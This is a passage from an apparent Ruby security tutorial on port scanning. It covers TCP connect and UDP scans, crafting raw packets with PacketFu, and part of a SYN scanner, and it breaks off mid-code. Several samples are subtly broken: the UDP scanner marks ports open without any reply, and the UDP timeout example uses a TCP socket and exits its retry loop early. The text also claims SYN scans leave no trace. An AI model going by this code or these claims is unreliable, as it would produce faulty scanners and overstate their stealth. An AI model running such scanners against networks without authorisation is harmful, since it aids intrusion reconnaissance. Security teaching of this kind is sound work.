  <span class="n">filtered</span> <span class="o">=</span> <span class="p">[]</span>

  <span class="n">start_port</span><span class="p">.</span><span class="nf">upto</span><span class="p">(</span><span class="n">end_port</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">port</span><span class="o">|</span>
    <span class="k">begin</span>
      <span class="c1"># Replace the comment below with your actual TCP socket connection logic</span>
      <span class="n">socket</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
      <span class="n">socket</span><span class="p">.</span><span class="nf">close</span>
      <span class="nb">open</span> <span class="o">&lt;&lt;</span> <span class="n">port</span>
    <span class="k">rescue</span> <span class="no">StandardError</span>
      <span class="n">filtered</span> <span class="o">&lt;&lt;</span> <span class="n">port</span>
    <span class="k">end</span>
  <span class="k">end</span>

  <span class="nb">puts</span> <span class="s2">"OPEN"</span> <span class="k">unless</span> <span class="nb">open</span><span class="p">.</span><span class="nf">empty?</span>
  <span class="nb">puts</span> <span class="nb">open</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s1">', '</span><span class="p">)</span> <span class="k">unless</span> <span class="nb">open</span><span class="p">.</span><span class="nf">empty?</span>
  <span class="nb">puts</span> <span class="s2">"FILTERED"</span> <span class="k">unless</span> <span class="n">filtered</span><span class="p">.</span><span class="nf">empty?</span>
  <span class="nb">puts</span> <span class="n">filtered</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s1">', '</span><span class="p">)</span> <span class="k">unless</span> <span class="n">filtered</span><span class="p">.</span><span class="nf">empty?</span>
<span class="k">end</span>

<span class="c1"># Example usage:</span>
<span class="c1"># main("example.com", 80, 100)</span>


</code></pre></div></div>

<p>The TCP SOCKET CONNECTION skeleton:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">begin</span>
  <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
  <span class="nb">open</span><span class="p">.</span><span class="nf">push</span> <span class="n">port</span>
<span class="k">rescue</span> <span class="no">Errno</span><span class="o">::</span><span class="no">ETIMEDOUT</span>
  <span class="n">filtered</span><span class="p">.</span><span class="nf">push</span> <span class="n">port</span>
<span class="k">rescue</span> <span class="no">Errno</span><span class="o">::</span><span class="no">ECONNREFUSED</span>
<span class="k">end</span>
</code></pre></div></div>

<blockquote>
  <p>if no exception occurs, then the port is open and we push it into the open array. If a timeout error is raised, the port is certainly filtered and we push it into the filtered array</p>
</blockquote>

<p>Usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="n">tcp_cps</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">ip</span> <span class="n">u</span> <span class="n">want</span> <span class="n">to</span> <span class="nb">scan</span><span class="o">&gt;</span> <span class="mi">1</span><span class="o">-</span><span class="mi">600</span> <span class="c1"># port range</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- the nmap equivalent to this is **-sT**
- nmap -sT -n &lt;ip&gt; -p &lt;range&gt;
- nmap uses faster strategies. one of them is working with more than one thread.
- our script is slow, a solution to this problem would be implementing multi-threading
</code></pre></div></div>

<h3 id="udp-port-scan">UDP Port scan</h3>
<ul>
  <li>Some import services such as DNS, SNMP and DHCP use UDP</li>
  <li>
    <p>udp is often ignored because its stateless and sometimes identifying if an UDP port is open or closed may take a lot of time.</p>
  </li>
  <li>For this reason, during our security audits we should run a UDP port scan, only to well-known ports and services, and only if its strictly necessary (do not scan big ranges of ports)</li>
  <li>Nmap documentation reports that a full and reliable UDP port scanning (65535 ports) can take more than 18 hours in some systems.</li>
</ul>

<p>Strategy to identify UDP open ports:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>first of all, we send an UDP packet to a port;
if we receive an ICMP error (destination unreachable or others) then we can conclude that the port is closed or firewalled;
if we receive an UDP response then the port is open and the service is available.
</code></pre></div></div>

<ul>
  <li>UDP is stateless, therefore if we do not receive a response, there is a chance that a packet (request or response) has been lost.</li>
  <li>there is also the likelihood that a firewall which avoids sending a ICMP packet as a response. Therefore when we use UDP, we should try to send the request packet more than once.</li>
  <li>platforms like Linux usually avoid sending too many packets of the same type (ICMP is one of them) in order to avoid network congestions. Linux sends an ICMP packet once per second; therefore our script must take this behavior into account.</li>
</ul>

<p>This is the skeleton of the script. We accept an array of ports to test. For each port, we have to send some UDP packets and catch any response:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nb">require</span> <span class="s1">'socket'</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">ports</span><span class="p">)</span>
  <span class="nb">open</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="n">filtered</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="n">closed</span> <span class="o">=</span> <span class="p">[]</span>

  <span class="c1"># ports is an array of port</span>
  <span class="n">ports</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">port</span><span class="o">|</span>
    <span class="k">begin</span>
      <span class="c1"># Replace the comment below with your actual UDP packet sending logic</span>
      <span class="n">socket</span> <span class="o">=</span> <span class="no">UDPSocket</span><span class="p">.</span><span class="nf">new</span>
      <span class="n">socket</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
      <span class="n">socket</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="s2">"Your UDP packet payload"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
      <span class="nb">open</span> <span class="o">&lt;&lt;</span> <span class="n">port</span>
    <span class="k">rescue</span> <span class="no">Errno</span><span class="o">::</span><span class="no">ECONNREFUSED</span><span class="p">,</span> <span class="no">Errno</span><span class="o">::</span><span class="no">EHOSTUNREACH</span>
      <span class="n">filtered</span> <span class="o">&lt;&lt;</span> <span class="n">port</span>
    <span class="k">rescue</span> <span class="no">StandardError</span>
      <span class="n">closed</span> <span class="o">&lt;&lt;</span> <span class="n">port</span>
    <span class="k">ensure</span>
      <span class="n">socket</span><span class="o">&amp;</span><span class="p">.</span><span class="nf">close</span>
    <span class="k">end</span>
  <span class="k">end</span>

  <span class="nb">puts</span> <span class="s2">"OPEN"</span> <span class="k">unless</span> <span class="nb">open</span><span class="p">.</span><span class="nf">empty?</span>
  <span class="nb">puts</span> <span class="nb">open</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s1">', '</span><span class="p">)</span> <span class="k">unless</span> <span class="nb">open</span><span class="p">.</span><span class="nf">empty?</span>
  <span class="nb">puts</span> <span class="s2">"FILTERED|OPEN"</span> <span class="k">unless</span> <span class="n">filtered</span><span class="p">.</span><span class="nf">empty?</span>
  <span class="nb">puts</span> <span class="n">filtered</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s1">', '</span><span class="p">)</span> <span class="k">unless</span> <span class="n">filtered</span><span class="p">.</span><span class="nf">empty?</span>
  <span class="nb">puts</span> <span class="s2">"CLOSED"</span> <span class="k">unless</span> <span class="n">closed</span><span class="p">.</span><span class="nf">empty?</span>
  <span class="nb">puts</span> <span class="n">closed</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s1">', '</span><span class="p">)</span> <span class="k">unless</span> <span class="n">closed</span><span class="p">.</span><span class="nf">empty?</span>
<span class="k">end</span>

<span class="c1"># Example usage:</span>
<span class="c1"># main("example.com", [80, 443, 8080])</span>


</code></pre></div></div>

<ul>
  <li>For each targert port, the first thing to do is to create an UDPSocket which will be bound to the destination host and port.</li>
</ul>

<p>Then we want to send 5 UDP packets using a proper timing strategy:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ports</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">port</span><span class="o">|</span>
  <span class="n">u</span> <span class="o">=</span> <span class="no">UDPSocket</span><span class="p">.</span><span class="nf">new</span>
  <span class="n">u</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
  <span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">5</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
	  <span class="c1">#send 5 UDP packet</span>
	  <span class="c1"># with a proper timeout</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<ul>
  <li>First we send a packet and wait For the first response</li>
  <li>if no response is received, the timeout is triggered (note that the timeout is incremental)</li>
</ul>

<p>If the timeout is triggered For all 5 packets then we consider the port filtered:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'timeout'</span>
<span class="nb">require</span> <span class="s1">'socket'</span>

<span class="n">u</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s1">'example.com'</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
<span class="nb">open</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">closed</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">filtered</span> <span class="o">=</span> <span class="p">[]</span>

<span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">5</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
  <span class="k">begin</span>
    <span class="no">Timeout</span><span class="p">.</span><span class="nf">timeout</span><span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mf">0.5</span><span class="p">)</span> <span class="k">do</span>
      <span class="n">u</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="s2">"</span><span class="se">\0</span><span class="s2">"</span><span class="p">)</span>
      <span class="n">u</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
      <span class="nb">open</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
    <span class="k">end</span>
  <span class="k">rescue</span> <span class="no">Errno</span><span class="o">::</span><span class="no">ECONNREFUSED</span>
    <span class="n">closed</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
  <span class="k">rescue</span> <span class="no">Timeout</span><span class="o">::</span><span class="no">Error</span>
    <span class="n">filtered</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">5</span>
  <span class="k">ensure</span>
    <span class="k">break</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="n">u</span><span class="p">.</span><span class="nf">close</span>

</code></pre></div></div>

<p>We can improve the script even more:</p>

<blockquote>
  <p>by add regex to verify the command parameter format (ip and ports)</p>
</blockquote>

<blockquote>
  <p>by add different logic (timing strategy or a multi-thread)</p>
</blockquote>

<h2 id="raw-socket">Raw Socket</h2>
<p>Can be used to interact with the network using a low level strategy. They usually needs root privileges to be used.</p>

<p>Raw sockets allow one to forge network packets (IP, UDP, TCP, and so on) by yourself but a high knowledge of network protocols and headers is required.</p>

<ul>
  <li>If u r familiar with low level concepts, check these links</li>
</ul>

<p>→ http://www.ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/Socket.html</p>

<p>→ http://www.ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/BasicSocket.html</p>

<h3 id="packetfu">PacketFu</h3>
<p>→ https://github.com/todb/packetfu</p>

<p>→ http://rubydoc.org/github/todb/packetfu/PacketFu</p>

<ul>
  <li>PacketFu is a Ruby library For reading and writing packets to a network interface.</li>
  <li>it requires <strong>pcarub</strong> to work. (another gem)</li>
</ul>

<p>Follow these steps to install PacketFu in Kali:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get <span class="nb">install </span>ruby-dev
apt-get <span class="nb">install </span>libpcap-dev
gem <span class="nb">install</span> <span class="nt">-r</span> pcaprub
gem <span class="nb">install</span> <span class="nt">-r</span> packetfu
</code></pre></div></div>

<p>To find what your gem path is:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="n">env</span>
</code></pre></div></div>

<p>Open PacketFu:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># go to the examples path in &lt;gem env path&gt;</span>
<span class="n">ruby</span> <span class="n">packetfu</span><span class="o">-</span><span class="n">shell</span><span class="p">.</span><span class="nf">rb</span>
</code></pre></div></div>

<blockquote>
  <p>if Packet capturing/injecting is enabled it works</p>
</blockquote>

<h4 id="usage">Usage</h4>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pry</span> <span class="o">--</span><span class="n">simple</span><span class="o">-</span><span class="n">prompt</span>
<span class="nb">require</span> <span class="s1">'packetfu'</span>
</code></pre></div></div>

<p>We can use many classes For different purposes:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PacketFu</span><span class="o">::</span><span class="no">IP</span>
<span class="no">PacketFu</span><span class="o">::</span><span class="no">TCP</span>
<span class="no">PacketFu</span><span class="o">::</span><span class="no">UDP</span>
</code></pre></div></div>

<p>In order to avoid writing the PacketFu namespace each time, we can use <strong>include</strong>:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kp">include</span> <span class="no">PacketFu</span>
<span class="no">IPHeader</span> <span class="c1"># the same as PacketFu::IPHeader</span>
<span class="no">TCPPacket</span> <span class="c1"># the same as PacketFu::TCPPacket</span>
</code></pre></div></div>

<p><strong>Utils</strong> class contains utility methods.</p>

<p>For example, it can be used to obtain information about our machine interfaces:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Utils</span><span class="p">.</span><span class="nf">ifconfig</span><span class="p">(</span><span class="s2">"eth0"</span><span class="p">)</span>
</code></pre></div></div>

<p>Perform an ARP request. // however it returns the mac address only if the specifies IP belongs to your default network interface (usually “eth0”):</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Utils</span><span class="p">.</span><span class="nf">arp</span><span class="p">(</span><span class="s2">"192.168.1.2"</span><span class="p">)</span>
</code></pre></div></div>

<p>To see the default network interface use by PacketFu:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Utils</span><span class="p">.</span><span class="nf">whoami?</span>
</code></pre></div></div>

<h3 id="forge-a-custom-packet">Forge a custom packet</h3>
<p>Common packets classes:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">ARPPacket</span>  <span class="c1"># constructs ARP packets</span>
<span class="no">EthPacket</span>   <span class="c1"># constructs Ethernet packets</span>
<span class="no">ICMPPacket</span> <span class="c1"># constructs ICMP packets</span>
<span class="no">IPPacket</span>     <span class="c1"># constructs IP packets</span>
<span class="no">TCPPacket</span>  <span class="c1"># constructs TCP packets</span>
<span class="no">UDPPacket</span> <span class="c1"># constructs UDP packets</span>
</code></pre></div></div>

<p>Each of the previous classes use suitable header and option or flags:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">IPHeader</span>     <span class="c1"># a complete IP structure</span>
<span class="no">ICMPHeader</span> <span class="c1"># a complete IP structure</span>
<span class="no">TCPHeader</span>   <span class="c1"># a complete TCP structure</span>
<span class="no">TCFlags</span>     <span class="c1"># Implements flag For TCPHeader</span>
<span class="no">ARPHeader</span> <span class="c1"># a complete ARP structure</span>
</code></pre></div></div>

<p>Lets see how to create a UDP packet from scratch:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">u</span> <span class="o">=</span> <span class="no">UDPPacket</span><span class="p">.</span><span class="nf">new</span>
</code></pre></div></div>

<p>To send a packet using PacketFu</p>

<p>First we need to use <strong>recalc</strong> method to recalculate all of the checksums of the packets, then <strong>to_w</strong>:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">u</span><span class="p">.</span><span class="nf">recalc</span>
<span class="n">u</span><span class="p">.</span><span class="nf">to_w</span>
</code></pre></div></div>

<ul>
  <li>
    <p>since we will forge the entire packet headers (Ethernet, IP and UDP), we have to be careful in order to create the packet correctly.</p>
  </li>
  <li>In order to obtain information such as the source IP, MAC address and gateway MAC address, we can use the class <strong>Utils</strong>.</li>
  <li>When we do not specify an interface, PacketFu uses the default eth0 so take that into account.</li>
</ul>

<p>The method <strong>Utils.whoami?</strong> contains the correct field values that we need (source MAC and IP addresses as well as the default gateway mac address):</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Utils</span><span class="p">.</span><span class="nf">whoami?</span>
<span class="n">s_ip</span> <span class="o">=</span> <span class="no">Utils</span><span class="p">.</span><span class="nf">whoami?</span><span class="p">[</span><span class="ss">:ip_saddr</span><span class="p">]</span>
<span class="n">s_mac</span> <span class="o">=</span> <span class="no">Utils</span><span class="p">.</span><span class="nf">whoami?</span><span class="p">[</span><span class="ss">:eth_saddr</span><span class="p">]</span> <span class="c1"># source address</span>
<span class="n">g_mac</span> <span class="o">=</span> <span class="no">Utils</span><span class="p">.</span><span class="nf">whoami?</span><span class="p">[</span><span class="ss">:eth_daddr</span><span class="p">]</span> <span class="c1"># destination address</span>
</code></pre></div></div>

<p>Set the UDP raw packet:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">u</span><span class="p">.</span><span class="nf">eth_saddr</span> <span class="o">=</span> <span class="n">s_mac</span>
<span class="n">u</span><span class="p">.</span><span class="nf">eth_daddr</span> <span class="o">=</span> <span class="n">g_mac</span>
</code></pre></div></div>

<p>Set the IP header:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">u</span><span class="p">.</span><span class="nf">ip_saddr</span> <span class="o">=</span> <span class="n">s_ip</span>
<span class="n">u</span><span class="p">.</span><span class="nf">ip_daddr</span> <span class="o">=</span> <span class="s2">"&lt;destination IP&gt;"</span>
</code></pre></div></div>

<p>Set the UDP source and destination ports:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">u</span><span class="p">.</span><span class="nf">udp_sport</span> <span class="o">=</span> <span class="mi">5000</span>
<span class="n">u</span><span class="p">.</span><span class="nf">udp_dport</span> <span class="o">=</span> <span class="mi">37</span>
</code></pre></div></div>

<p>We can send the packet now:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">u</span><span class="p">.</span><span class="nf">recalc</span>
<span class="n">u</span><span class="p">.</span><span class="nf">to_w</span>
</code></pre></div></div>

<blockquote>
  <p>sniff the traffic with wireshark to grab the packet</p>
</blockquote>

<ul>
  <li>Since we are using raw sockets, we sent the packets directly to the network without going through the kernel TCP/IP stack</li>
  <li>This means that in our kernel, we do not have a real socket (bound to UDP source port) that is waiting For an UDP time response</li>
  <li>As defined in the UDP/TCP RFC, when the kernel receives an undesired UDP packet, it responds with an ICMP destination unreachable (Port unreachable)</li>
</ul>

<p>A trick to avoid the ICMP kernel response is to create an UDP socket which binds itself to our source port.</p>

<p>Now the kernel has its socket bound to the source port 5000 so the ICMP packet is no longer generated by the OS:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="no">UDPSocket</span><span class="p">.</span><span class="nf">new</span>
<span class="n">s</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="s2">"192.168.3.24"</span><span class="p">,</span><span class="s2">"5000"</span><span class="p">)</span>
<span class="n">u</span><span class="p">.</span><span class="nf">to_w</span>
</code></pre></div></div>

<ul>
  <li>Doin the same thing For all other packets can be tedious. PacketFu allows some different methods to forge packets quickly</li>
</ul>

<p>We can use <strong>config</strong> parameter:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">u</span> <span class="o">=</span> <span class="no">UDPPacket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="ss">:config</span><span class="o">=&gt;</span><span class="no">Utils</span><span class="p">.</span><span class="nf">whoami?</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="tcp-syn-port-scanner">TCP SYN port scanner</h2>

<ul>
  <li>now we can write more sophisticated tcp port scanner that avoid finalizing the 3-way handshake. This is called TCP SYN scan</li>
  <li>TCP SYN scan can be used to leave no trace</li>
</ul>

<p>A common DOS attack is called TCP SYN flood, where the attacker sends  a flood of syn packets, until a crash happens.</p>

<h3 id="the-strategy">The strategy</h3>

<ol>
  <li>The syn packet sends a syn</li>
  <li>if the port is open the target answer with syn,ack</li>
  <li>and we send RST to close the connection, means that we do not close the 3way handshake with another ack</li>
  <li>if the port is closed, after the first syn, the target answers with a RST+ACK</li>
  <li>if the ports is filtered, we will send 2 syns without any answer</li>
</ol>

<ul>
  <li>To create TCPPacket using packetFu, we need to set the Ethernet, the IP header fields and the TCP header with the correct destination port and SYN flag enabled</li>
</ul>

<p>We can use the <strong>config</strong> aswell:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t</span> <span class="o">=</span> <span class="no">TCPPacket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="ss">:config</span><span class="o">=&gt;</span><span class="no">Utils</span><span class="p">.</span><span class="nf">whoami?</span><span class="p">)</span>
</code></pre></div></div>

<p>Pay attention, Eth destination now is not the default gateway</p>

<ul>
  <li>the target host 192.168.3.14 belongs to our network</li>
</ul>

<p>Since its in our network, we can grab the MAC with an ARP request:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t</span><span class="p">.</span><span class="nf">ip_daddr</span> <span class="o">=</span> <span class="s2">"192.168.3.14"</span>
<span class="n">t</span><span class="p">.</span><span class="nf">eth_daddr</span> <span class="o">=</span> <span class="no">Utils</span><span class="p">.</span><span class="nf">arp</span><span class="p">(</span><span class="s2">"192.168.3.14"</span><span class="p">)</span>
<span class="c1"># mac output</span>
<span class="n">t</span>
</code></pre></div></div>

<blockquote>
  <p>now EthHeader and IPheader have the correct value</p>
</blockquote>

<p>The destination port is 135 while the source port may be a random value:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t</span><span class="p">.</span><span class="nf">tcp_sport</span> <span class="o">=</span> <span class="mi">5000</span>
<span class="n">t</span><span class="p">.</span><span class="nf">tcp_dport</span> <span class="o">=</span> <span class="mi">135</span>
<span class="n">t</span><span class="p">.</span><span class="nf">tcp_flags</span><span class="p">.</span><span class="nf">syn</span> <span class="o">=</span> <span class="mi">1</span>

<span class="n">t</span>
</code></pre></div></div>

<blockquote>
  <p>Now the TCP packet is properly configured</p>
</blockquote>

<p>Its ready to be sent:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t</span><span class="p">.</span><span class="nf">recalc</span>
<span class="n">t</span><span class="p">.</span><span class="nf">to_w</span>
<span class="c1"># we can analyse with wireshark</span>
</code></pre></div></div>

<p>We want our script to be capable of detecting the SYN+ACK. PacketFu provides the <strong>Capture</strong> class to sniff every packet received on a specific network interface.</p>

<ul>
  <li>to use <strong>capture</strong> we need to create a Capture object and then specify the interface where it will capture the traffic (eth0 is the default NIC)</li>
  <li>after this, we can use the capture method to sniff packets received by the interface. we can also specify a filter as a capture parameter in order to capture only specific packets.</li>
</ul>

<p>To extract all of the TCP packets that have source IP address equal to 192.168.3.14 and 135 as source port from the eth0 interface:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cap</span> <span class="o">=</span> <span class="no">Capture</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="ss">:iface</span><span class="o">=&gt;</span><span class="s2">"eth0"</span><span class="p">)</span>
</code></pre></div></div>

<p>The filter For the capture method is given usinf the BPF syntax (Berkeley Packet Filter):</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span> <span class="n">host</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">3.14</span> <span class="ow">and</span> <span class="n">src</span> <span class="n">port</span> <span class="mi">135</span>
<span class="n">cap</span><span class="p">.</span><span class="nf">capture</span><span class="p">(</span><span class="ss">:filter</span><span class="o">=&gt;</span><span class="s2">"src host 192.168.3.14 and src port 135"</span><span class="p">)</span>
</code></pre></div></div>

<p>To check if our interface received a packet which matches the filter, we can use the next method. If it returns nil, it means that there is not one matching. Otherwise, the packet is returned:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">raw_packet</span> <span class="o">=</span> <span class="n">cap</span><span class="p">.</span><span class="nf">next</span>
</code></pre></div></div>

<ul>
  <li>PacketFu allows one to parse raw packets using the Parse class.</li>
</ul>

<p>Parsing the received raw_packet we will obtain a PacketFu TCP packet:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcp_packet</span> <span class="o">=</span> <span class="no">Packet</span><span class="p">.</span><span class="nf">parse</span> <span class="n">raw_packet</span>
</code></pre></div></div>

<blockquote>
  <p>As we can see in the interpreter, the packet received is the desired SYN+ACK (flag A and S) packet coming from port:135 and host:192.168.3.14</p>
</blockquote>

<h4 id="the-script">The script</h4>
<p>First, we have to start a packet sniffer that is able to read all of the response packets: SYN+ACK For opened ports and RST+ACK For closed ports.</p>

<ul>
  <li>when the sniffer is ready, we can send the TCP SYN packet For each port we want to test</li>
</ul>

<p>For all of the ports that are not opened or closed, there is a high likehood that they are filtered:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">start_port</span><span class="p">,</span><span class="n">end_port</span><span class="p">)</span>
  <span class="nb">open</span> <span class="o">=</span> <span class="p">[];</span> <span class="n">closed</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="n">start_capture</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="nb">open</span><span class="p">,</span><span class="n">closed</span><span class="p">,</span><span class="n">start_port</span><span class="p">,</span><span class="n">end_port</span><span class="p">)</span>
  <span class="n">send_tcp_syn</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">start_port</span><span class="p">,</span><span class="n">end_port</span><span class="p">)</span>
  <span class="n">filtered</span><span class="o">=</span><span class="p">(</span><span class="n">start_port</span><span class="o">..</span><span class="n">end_port</span><span class="p">).</span><span class="nf">to_a</span> <span class="o">-</span> <span class="p">(</span><span class="nb">open</span><span class="o">+</span><span class="n">closed</span><span class="p">)</span>
  <span class="nb">puts</span> <span class="s2">"OPEN"</span><span class="p">,</span><span class="nb">open</span> <span class="k">if</span> <span class="o">!</span><span class="nb">open</span><span class="p">.</span><span class="nf">empty?</span>
  <span class="nb">puts</span> <span class="s2">"FILTERED"</span><span class="p">,</span><span class="n">filtered</span> <span class="k">if</span> <span class="o">!</span><span class="n">filtered</span><span class="p">.</span><span class="nf">empty?</span>
<span class="k">end</span>
</code></pre></div></div>

<p>For the <strong>start_capture</strong> method, a new thread is required; we sniff TCP SYN+ACK and RST+ACK at the same time we send TCP SYN:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'packetfu'</span>

<span class="k">def</span> <span class="nf">start_capture</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">open_ports</span><span class="p">,</span> <span class="n">closed_ports</span><span class="p">,</span> <span class="n">start_port</span><span class="p">,</span> <span class="n">end_port</span><span class="p">)</span>
  <span class="no">Thread</span><span class="p">.</span><span class="nf">new</span> <span class="k">do</span>
    <span class="n">cap</span> <span class="o">=</span> <span class="no">Capture</span><span class="p">.</span><span class="nf">new</span>
    <span class="n">cap</span><span class="p">.</span><span class="nf">capture</span><span class="p">(</span><span class="ss">filter: </span><span class="s2">"tcp and src host </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

    <span class="n">cap</span><span class="p">.</span><span class="nf">stream</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">raw_packet</span><span class="o">|</span>
      <span class="n">tcp_packet</span> <span class="o">=</span> <span class="no">Packet</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">raw_packet</span><span class="p">)</span>
      <span class="n">port</span> <span class="o">=</span> <span class="n">tcp_packet</span><span class="p">.</span><span class="nf">tcp_sport</span><span class="p">.</span><span class="nf">to_i</span>

      <span class="k">next</span> <span class="k">unless</span> <span class="n">port</span><span class="p">.</span><span class="nf">between?</span><span class="p">(</span><span class="n">start_port</span><span class="p">,</span> <span class="n">end_port</span><span class="p">)</span>

      <span class="n">flags</span> <span class="o">=</span> <span class="n">tcp_packet</span><span class="p">.</span><span class="nf">tcp_flags</span>

